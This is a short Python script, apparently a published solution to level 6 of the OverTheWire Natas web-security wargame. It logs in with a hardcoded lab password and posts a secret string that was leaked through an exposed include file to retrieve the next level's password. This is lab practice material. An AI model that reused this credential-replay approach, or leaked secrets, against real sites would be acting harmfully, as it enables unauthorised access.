# Natas6 python solution
# By Emil 'Dota' Bak, 2019

import requests

# ***********************************************
URL = "http://natas6.natas.labs.overthewire.org"

auth_name = 'natas6'
auth_pass = 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'

s      = requests.Session()
s.auth = (auth_name,auth_pass)
# ***********************************************

# The viewable source code hints at a '/includes/secret.inc' location, in
# which the secret string the user must match is hidden.
SECRET = "FOEIUWGHFEEUHOFUOIU"

# Data is made ready for the upcoming post-request.
DATA = dict(secret=SECRET, submit="submit")

r = s.post(URL, data=DATA)

for x in r.iter_lines():
    if "password" in x:
        print x